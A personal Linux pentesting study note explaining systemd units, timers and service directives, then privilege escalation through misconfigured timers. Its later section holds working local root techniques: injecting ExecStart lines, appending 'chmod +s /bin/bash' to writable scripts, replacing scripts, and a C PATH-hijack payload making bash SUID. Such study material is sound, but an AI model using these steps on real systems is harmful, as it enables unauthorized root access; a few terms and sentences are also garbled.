---
created: 26-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## Systemd timers and services

>**[systemd](https://systemd.io/)** is a system and service manager for Linux operating systems that runs as PID `1`.

- In systemd, everything is a **unit**.
- Unit configuration is defined by **unit files**.
- Units declare **relationships** between each other, such as dependencies.

Units files have the following naming format:

```python
name.type
```

- In total, systemd defines **11 different unit types**:

| Unit file    | Description                                                                                                                         | Man page                                                                                 |
| ------------ | ----------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| `.service`   | Manages system services (daemons).                                                                                                  | [`systemd.service(5)`](https://man7.org/linux/man-pages/man5/systemd.service.5.html)     |
| `.timer`     | Time-based unit activation and scheduling (Cron replacement).                                                                       | [`systemd.timer(5)`](https://man7.org/linux/man-pages/man5/systemd.timer.5.html)         |
| `.socket`    | Represents network (TCP/UDP) and Unix domain sockets.                                                                               | [`systemd.socket(5)`](https://man7.org/linux/man-pages/man5/systemd.socket.5.html)       |
| `.target`    | A group of other units.                                                                                                             | [`systemd.target(5)`](https://www.man7.org/linux/man-pages/man5/systemd.target.5.html)   |
| `.device`    | Manages units for kernel devices (`/sys` or `/dev`).                                                                                | [`systemd.device(5)`](https://www.man7.org/linux/man-pages/man5/systemd.device.5.html)   |
| `.mount`     | Manages filesystem mounts.                                                                                                          | [`systemd.mount(5)`](https://www.man7.org/linux/man-pages/man5/systemd.mount.5.html)     |
| `.automount` | Manages on-demand filesystem mounts (typically used for remote or removable media).                                                 | [`systemd.automount(5)`](https://man7.org/linux/man-pages/man5/systemd.automount.5.html) |
| `.path`      | Used to monitor files and directories for specific events; can trigger actions when certain conditions are met (e.g., file change). | [`systemd.path(5)`](https://man7.org/linux/man-pages/man5/systemd.path.5.html)           |
| `.swap`      | Used to manage swap devices or files for memory paging.                                                                             | [`systemd.swap(5)`](https://man7.org/linux/man-pages/man5/systemd.swap.5.html)           |
| `.slice`     | Manages resources of a group of processes (with cgroups).                                                                           | [`systemd.slice(5)`](https://man7.org/linux/man-pages/man5/systemd.slice.5.html)         |
| `.scope`     | Manages a set of externally created system processes.                                                                               | [`systemd.scope(5)`](https://man7.org/linux/man-pages/man5/systemd.scope.5.html)         |
Unit types most relevant to privilege escalation are **timers** and **services**.
### Timers and services

>A **service unit** defines how systemd _starts, supervises, stops, and accounts for_ one or more processes.

- A `.service` file defines what to execute, how it runs, when it runs, its restart behavior, timeouts, logging, resource limits, environments, etc. It describes a **process lifecycle** and its relationship to the system state.
- Services can be long-running (daemons), one-shot (batch jobs), or transient.
- Services don't run by themselves. They must be triggered by other units — targets, sockets, paths, or **timers**.

>A **timer unit** defines a **time-based activation policy** for another unit, usually a service.

On modern Linux systems, **systemd timers replace Cron**.

- A timer unit defines _when_ another unit is activated (not _what_ is executed).
- Triggers can be **monolithic** (relative to system events, such as boot or activation/inactivation of another unit — `OnBootSec=`, `OnStartupSec=`, `OnUnitActiveSec=`, `OnUnitInactiveSec=`), or **real-time** (triggered on schedule — `OnCalendar=`).
- If a timer is configured with `Persistent=true`, jobs missed when the system was down will run immediately on next boot. Without persistence, missed events are skipped. This is unlike Cron jobs, that aren't automatically rescheduled when the system goes down.

>[!important] **Timers do not execute scripts or commands directly.** They can only **activate other units**, usually **services**.
>```bash
>.timer  →  .service  →  ExecStart=... → (maybe a script)
>```

### Unit file locations

Systemd looks for units in multiple directories, and **precedence is key**. If two files have the same name, the one in the higher-priority directory is loaded.

From highest to lowest priority:

- `/etc/systemd/system/`
	- Administrator overrides. The primary directory for system-wide unit files that are created, modified, or installed by system administrators.
	- Unit files placed here will take precedence over identical unit files in other directories. 

- `/run/systemd/system/`
	- Runtime configuration for transient units; volatile, changes are lost on reboot.

- `/lib/systemd/system/` or `/usr/lib/systemd/system/`
	- Vendor defaults. This contains unit files provided by the distribution package manager (e.g., `apt`, `yum`).
	- Files here are generally overridden during operating system updates, so you shouldn't modify files here. 
### Unit file structure

- Systemd unit files use the **INI format**.
- Files are organized into sections, each denoted by `[Header]`.
- Each section contains directives, `Key=Value` pairs that define the unit behavior and other information. 

The general structure of each section is this:

```toml
[Section]
Directive=Value
Directive=Value
```

Each unit file typically includes at least these three sections:

- `[Unit]`
	- Generic information about the unit; metadata and dependencies.
	- Specifies relationships of this unit to others (e.g., dependencies, conflicting units, etc.).

- Unit-specific directive
	- Depending on the unit type, this can be `[Service]`,  `[Socket]`, `[Slice]`, `[Scope]`, `[Mount]`, `[Automount]`, `[Path]`, `[Timer]` or `[Swap]`.

- `[Install]`
	- Optional, defines installation options for enabling or disabling the unit.
	- This may include, for example, required dependencies that will cause activation failure if not met, or an alternative name that can be used to enable this unit.

>[!example]+ Example: `dbus.service` unit file
> As an example, we will use the `dbus.service` unit file, located at `/usr/lib/systemd/system/dbus.service`:
> 
> ```bash
> cat /usr/lib/systemd/system/dbus.service
> ```
> 
> ```INI
> [Unit]
> Description=D-Bus System Message Bus
> Documentation=man:dbus-broker-launch(1)
> DefaultDependencies=false
> After=dbus.socket
> Before=basic.target shutdown.target
> Requires=dbus.socket
> Conflicts=shutdown.target
> 
> [Service]
> Type=notify-reload
> Sockets=dbus.socket
> OOMScoreAdjust=-900
> LimitNOFILE=16384
> ProtectSystem=full
> PrivateTmp=true
> PrivateDevices=true
> ExecStart=/usr/bin/dbus-broker-launch --scope system --audit
> 
> [Install]
> Alias=dbus.service
> ```

### `[Unit]` section

The `[Unit]` section carries generic information about the unit that **does not depend on the unit type**. It also specifies when the unit runs and relationships with other units.

Common `[Unit]` directives:

- `Description=`
	- A brief, human-readable text that describes the unit.

- `Documentation=`
	- A space-separated list of URIs referencing documentation for this unit or its configuration (accepted URLs are only of types `http://`, `https://`, `file:`, `info:`, `man:`).

Below are some of the most common directives that control relationships between units:

- `After=`
	- This unit starts after the listed units.

- `Before=`
	- This unit starts before the listed units.

- `Requires=`
	- **Strong dependency**; if the required unit fails, this unit fails as well.

- `Wants=`
	- **Weak dependency**; if the wanted unit fails, this unit continues anyway. In most cases, preferred over `Requires=`.

- `Requisite=`
	- Similar to `Requires=`, but checks if required units are already active. If not, this unit fails immediately.

- `BindsTo=`
	- Like `Requires=`, but also stops this unit if the bound unit stops.

- `PartOf=`
	- If the listed unit stops/restarts, this unit also stops/restarts (one-way relationship).

- `Conflicts=`
	- Negative dependency; the unit can't run simultaneously with the listed units. If this unit starts, the conflicting units stop.

Depending on the exit status of the unit:

- `OnFailure=`
	- Units to be activated when this unit enters the `failed` state.
- `OnSuccess=`
	- Units to be activated when this unit enters the `inactive` state.

>[!note] For a complete list, see [`[Unit] Section Options — systemd.unit`](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html#%5BUnit%5D%20Section%20Options). 

### `[Service]` section

The `[Service]` section defines how code is executed by a service unit. 

Common `[Service]` directives:

- `Type=` defines **how and when systemd considers a service started**. This affects **ordering, dependencies, and timers**.

| Type            | Description                                                                                                                                                                                                                                                            |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `simple`        | The service is considered started **immediately after the process is forked**. The process started by `ExecStart=` is the main process. Default if `ExecStart=` is set and no `Type=` or `BusName=` is specified.                                                      |
| `exec`          | Similar to `simple`, but systemd waits until the binary is **successfully `execve()`-d**. No shell is involved. Slightly stricter startup validation.                                                                                                                  |
| `forking`       | The service **forks into the background**. The parent process exits, and the child becomes the main service. Common for legacy daemons. Usually requires `PIDFile=`.                                                                                                   |
| `oneshot`       | Executes one or more commands and then exits. The service is considered active only while the commands are running (unless `RemainAfterExit=yes`). Common for **scripts triggered by timers**.<br>`oneshot` services may specify **multiple `ExecStart=` directives**. |
| `notify`        | The service sends a readiness notification to systemd via `sd_notify()`. The service is considered started **only after the notification is received**.                                                                                                                |
| `notify-reload` | Like `notify`, but also supports notifying systemd when the service reloads its configuration.                                                                                                                                                                         |
| `dbus`          | The service acquires a D-Bus name specified by `BusName=`. The service is considered started once the name is taken.                                                                                                                                                   |
| `idle`          | Like `simple`, but execution is delayed until all active jobs are dispatched. Rarely used.                                                                                                                                                                             |

Command execution:

- `ExecStart=` defines the commands executed when this service is started. 
	- **Unless `Type=` is `oneshot`, exactly one command must be given** (if `oneshot`, `ExecStart=` may be used multiple times, commands will be executed in order).
	- If no `ExecStart=` is specified, the service must have `RemainAfterExit=yes` and at least one `ExecStop=` line set.
	- Services lacking both `ExecStart=` and `ExecStop=` are not valid.

```bash
ExecStart=/usr/bin/rsync -a /home /backup
```

- `ExecStartPre=`, `ExecStartPost=`
	- Additional commands that are executed before or after the command in `ExecStart=`, respectively. 

- `ExecCondition=`
	- Optional commands that are executed before the commands in `ExecStartPre=`. Syntax is the same as for `ExecStart=`.
	- If commands in `ExecCondition=` exit with codes: 
		- `1`-`254` -> the remaining commands are skipped but the unit is **not** marked as failed.
		- `255` -> the remaining commands are skipped and the unit **is** marked as failed.
		- `0` -> the service continues to execute the remaining commands.

- `ExecStop=`
	- Commands to execute to stop the service started via `ExecStart=`.

- `Restart=`
	- Configures whether the service shall be restarted when the service process exits, is killed, or a timeout is reached.
	- Takes one of `no` (default), `on-success`, `on-failure`, `on-abnormal`, `on-watchdog`, `on-abort`, or `always`.

| Restart settings/Exit causes | `no` | `always` | `on-success` | `on-failure` | `on-abnormal` | `on-abort` | `on-watchdog` |
| ---------------------------- | ---- | -------- | ------------ | ------------ | ------------- | ---------- | ------------- |
| Clean exit code or signal    |      | ✔️       | ✔️           |              |               |            |               |
| Unclean exit code            |      | ✔️       |              | ✔️           |               |            |               |
| Unclean signal               |      | ✔️       |              | ✔️           | ✔️            | ✔️         |               |
| Timeout                      |      | ✔️       |              | ✔️           | ✔️            |            |               |
| Watchdog                     |      | ✔️       |              | ✔️           | ✔️            |            | ✔️            |
| Termination due to OOM       |      | ✔️       |              | ✔️           | ✔️            |            |               |

>[!important]+ Systemd does not invoke shell by default, neither it expands globbing or variables by default.

Execution environment:

- `User=`, `Group=`
	- The Unix user or group the process is executed as, respectively. May be set to user/group name, or UID/GID.

- `WorkingDirectory=`
	- Takes a directory path relative to the host's root directory (with the [`pivot_root`](https://man7.org/linux/man-pages/man2/pivot_root.2.html) or [`chroot`](https://man7.org/linux/man-pages/man2/chroot.2.html) system calls).
	- Sets the working directory for executed processes. 
	- Takes a directory path relative to the service's root directory specified by `RootDirectory=`, or the special value `~`.

- `RootDirectory=`
	- Takes a directory path relative to the host's root directory.

- `Environment=`
	- Sets the environment variables for executed processes.
	- No variable expansion.

```bash
Environment=PATH=/usr/local/bin:/usr/bin
Environment=BACKUP_DIR=/home/user
```

- `EnvironmentFile=`
	- Similar to `Environment=`, but reads the environment variables from a text file.
	- The text file should contain newline-separated variable assignments.

 - `CapabilityBoundingSet=`
	- Which [[capabilities]] to include in the bounding set for the executed process.
	- Capabilities listed will be included in the bounding set, all others are removed.

- `NoNewPrivilege=`
	- If set to true, ensures that the service process and all its children can never gain new privileges through `execve()` (no `setuid`, `setgid`, or filesystem capabilities).

- `SecureBits=`
	- Controls the secure bits for the executed process; takes a space-separated combination of options from the following list: `keep-caps`, `keep-caps-locked`, `no-setuid-fixup`, `no-setuid-fixup-locked`, `noroot`, and `noroot-locked`.
	- By default, all bits are set to `0`.
	- This does not affect commands prefixed with `+`.

>[!note] See [`systemd.service`](https://www.freedesktop.org/software/systemd/man/latest/systemd.service.html) and [`systemd.exec`](https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html).
### `[Timer]` section

The `[Timer]` section specifies how timer behaves.

- `Unit=`
	- The unit to activate when this timer elapses.
	- Takes a unit name those suffix is not `.timer`.
	- If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix.

- `OnCalendar=`
	- Defines when the timer triggers.

```bash
OnCalendar=*:0/5
```

- `OnActiveSec=`
	- Defines a timer relative to the moment the timer unit itself is activated.

```bash
OnActiveSec=5min
```

- `OnBootSec=` 
	- Defines a timer relative to when the machine was booted up.

- `OnStartupSec=`
	- Defines a timer relative to when the service manager was first started; very similar to `OnBootSec=`, since the system service manager is started very early at boot.

- `OnUnitActiveSec=`
	- Defines a timer relative to last execution.

>[!note] [`systemd.timer`](https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html) and [`systemd.time`](https://www.freedesktop.org/software/systemd/man/latest/systemd.time.html).

## Enumeration

- Confirm that the target system uses systemd:

```bash
ps -p 1 -o comm=
```

If it returns `systemd`, you're good to go.

- List all systemd timers:

```bash
systemctl list-timers --all
```

- Display without a pager:

```bash
systemctl list-timers --all --no-pager
```

```bash
export SYSTEMD_PAGER=""
systemctl list-timers --all
```

- Look for timers that're linked to services with suspicious paths; prioritize those that run frequently.

>[!example]+
> 
> ```bash
> systemctl list-timers --all                                                           
> ```
> 
> ```bash
> NEXT                             LEFT LAST                              PASSED UNIT                             ACTIVATES                         
> Sat 2026-01-31 14:03:40 CET  1h 51min Fri 2026-01-30 16:10:20 CET            - man-db.timer                     man-db.service
> Sun 2026-02-01 00:00:00 CET       11h Sat 2026-01-31 10:36:41 CET 1h 35min ago shadow.timer                     shadow.service
> Sun 2026-02-01 10:51:24 CET       22h Sat 2026-01-31 10:51:24 CET 1h 21min ago systemd-tmpfiles-clean.timer     systemd-tmpfiles-clean.service
> Mon 2026-02-02 01:15:46 CET 1 day 13h Mon 2026-01-26 09:33:19 CET            - fstrim.timer                     fstrim.service
> Mon 2026-02-02 20:56:35 CET    2 days Mon 2026-01-26 15:10:22 CET            - archlinux-keyring-wkd-sync.timer archlinux-keyring-wkd-sync.service
> 
> 5 timers listed.
> ```

- Check timer status:

```bash
systemctl status backup.timer
```

- Check what the timer activates:

```bash
systemctl show backup.timer -p Unit
```

- Read the associated unit files:

```bash
systemctl cat backup.timer
```

```bash
systemctl cat backup.service
```


- Check unit file permissions:

```bash
ls -l /etc/systemd/system/backup.service
```

```bash
ls -l /etc/systemd/system/backup.timer
```
## Privilege escalation via systemd timers

>[!important] If the `User=` and `Group=` directives are **not defined**, systemd will **run the service as the root user** by default.

This means that if you can influence what such service does, you can make it execute commands with elevated privileges.

>[!note] Why here we talk about timers is because you're more likely to exploit services activated on a schedule rather than those triggered by other units once in a while. But the general principle also applies to units activated by other means, such as `.path` — you just need to make this happen.

Common exploitation vectors:
- Writable unit files
- Writable scripts
- Writable script directories
- World-writable environment file and `PATH` hijacking
### Writable unit files

- If you can write to a **service unit file (`.serivce`)**, you can directly influence what commands or scripts it executes by changing the `ExecStart` directive or adding a new one (for `Type=oneshot` units).

```bash
[Service]
Type=oneshot
ExecStart=/usr/local/bin/backup.sh
ExecStart=/bin/bash -c "/bin/chmod +s /bin/bash"
```

- If you can write to a **timer unit file (`.timer`)**, you can change which unit it starts and at what schedule.

- Find writable unit files:

```bash
find / -ls \( -writable -o -perm 002 \) 2>/dev/null | grep -E '/etc/systemd/system|/run/systemd/system|/lib/systemd/system|/usr/lib/systemd/system'
```

>[!important] Once you've modified a unit file, you need to reload systemd and restart the service (if you have permission, or wait for a reboot/service restart):
>```bash
>systemctl daemon-reload
>```
>```bash
>systemctl restart backup.service
>```
### Writable scripts

- If you can write to a script executed by a privileged service, you can make it run arbitrary commands as root. systemd does **no integrity checking** on scripts.

>[!example]+
> - For example, you find a service like this:
> 
> ```bash
> [Service]
> ExecStart=/usr/local/bin/backup.sh
> ```
> 
> - You check permissions and find you can modify the script:
> 
> ```bash
> ls -l /usr/local/bin/backup.sh
> ```
> 
> ```bash
> -rwxrwxr-x 1 root users backup.sh
> ```
> 
> - Append payload:
> 
> ```bash
> echo 'chmod +s /bin/bash' >> /usr/local/bin/backup.sh
> ```
> 
> - Wait for the timer, then get a root shell:
> 
> ```bash
> /bin/bash -p
> ```

### Writable script directories

- Even if the script itself is not writable, but the directory where it rests is, **you can replace the script entirely**.

>[!example]+
>
> - You find a service that executes a script:
> 
> ```bash
> [Service]
> ExecStart=/opt/scripts/cleanup.sh
> ```
> 
> 
> - You check permissions of the directory where the script is located and find out it's writable:
> 
> ```bash
> ls -ld /opt/scripts
> ```
> ```bash
> drwxrwxr-x root users /opt/scripts
> ```
> 
> - You rename the original script and create a new one with the name the service refers to with a privilege escalation payload inside:
> 
> ```bash
> mv /opt/scripts/cleanup.sh /opt/scripts/cleanup.sh.bak
> ```
> 
> ```bash
> echo -e '#!/bin/bash\nchmod +s /bin/bash' > /opt/scripts/cleanup.sh
> ```
> 
> ```bash
> chmod +x /opt/scripts/cleanup.sh
> ```

#### `systemctl edit`


- If can run `systemctl edit` with elevated privileges (say, you have `sudo` access to it, or it's misconfigured to be a SUID binary), you use it to modify unit files even if you can't do that directly:

```bash
sudo systemctl edit backup.service
```


### World-writable environment file and `PATH` hijacking

- Systemd services often load environment variables from a file using `EnvironmentFile=`. If this file is world-writable, and the service or scripts it runs execute a command without specifying its full paths, you can exploit this in **`PATH` hijacking**.

>[!example]+
> - Suppose you find a service that uses a world-writable `EnvironmentFile=`:
> 
> ```bash
> [Service]
> User=root
> EnvironmentFile=/etc/backup/config
> ExecStart=/usr/local/bin/backup.sh
> ```
> 
> - `backup.sh` this service executes uses the `rsync` command without specifying its full path. 
> - To exploit this, you modify `/etc/backup/config` to add `/tmp` to the `PATH` the service uses, and then compile your payload as `/tmp/rsync`:
> 
> ```C
> // /tmp/payload.c
> #include <stdlib.h>
> #include <unistd.h>
> 
> int main() {
>     setuid(0);
>     setgid(0);
>     // grant persistent access by setting the SUID bit on bash
>     system("chmod 4777 /bin/bash");
>     return 0;
> }
> ```
> 
> ```bash
> gcc /tmp/payload.c -o /tmp/rsync && chmod +x /tmp/rsync
> ```
> 
> - Wait for the timer to trigger the service, and spawn a root shell:
> 
> ```bash
> /bin/bash -p
> ```

>[!note] See [[PATH_hijacking]].
## Reloading vs. restarting

Systemd reads **unit files** (`.service`, `.socket`, `.timer`, etc.) from disk and keeps them **cached in memory**.
When you **edit or add a unit file**, systemd **does not automatically notice** the change.

- To make systemd reread the unit files, you use:

```bash
sudo systemctl daemon-reload
```

This reloads unit definitions, but **not services themselves**. This **does not automatically apply changes to already-running services**.

- To make systemd restart a service with whatever the unit definition systemd currently has loaded:

```bash
sudo systemctl restart backup.service
```

So, to apply unit configuration once you've changed the unit file, you need **both commands**.

- If you'd only ran `restart`, but not `daemon-reload`, systemd would restart the service **with the old cached unit configuration**.
- If you only ran `daemon-reload` but not `restart`, systemd would see the update of the unit file, but would keep running services running exactly as they were.

This is because both these commands require root privileges by default systemd does timer exploitation becomes so challenging.
## References and further reading

- [`systemd.service`](https://www.freedesktop.org/software/systemd/man/latest/systemd.service.html?__goaway_challenge=meta-refresh&__goaway_id=ca2dce29c0ea1ac9df7c66f21e1de356&__goaway_referer=https%3A%2F%2Fsearch.brave.com%2F)
- [`systemd.timer`](https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html)
- [`systemd.exec`](https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html)
- [`systemd.unit`](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html)
- [`systemd.time`](https://www.freedesktop.org/software/systemd/man/latest/systemd.time.html)
- [`[Unit] Section Options — systemd.unit`](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html#%5BUnit%5D%20Section%20Options)
- [`systemd/Timers`](https://wiki.archlinux.org/title/Systemd/Timers)

- [`Scheduled Task/Job: Systemd Timers — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1053/006/)